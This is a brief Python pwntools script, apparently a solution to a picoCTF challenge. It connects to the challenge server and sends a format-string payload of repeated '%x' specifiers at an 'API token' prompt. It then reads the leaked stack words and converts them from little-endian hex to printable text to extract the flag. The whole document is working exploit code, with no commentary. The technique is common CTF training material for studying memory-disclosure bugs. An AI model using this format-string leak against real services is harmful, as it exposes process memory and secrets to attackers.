from pwn import *


r = remote('mercury.picoctf.net', 33411)

r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")
r.send("%x" + "-%x"*40 + "\n")
r.recvline()

x = r.recvline()
x = x[:-1].decode()

s = ""
for i in x.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)
        for b in reversed(a):
            if b > 32 and b < 128: s += chr(b)

print(s)

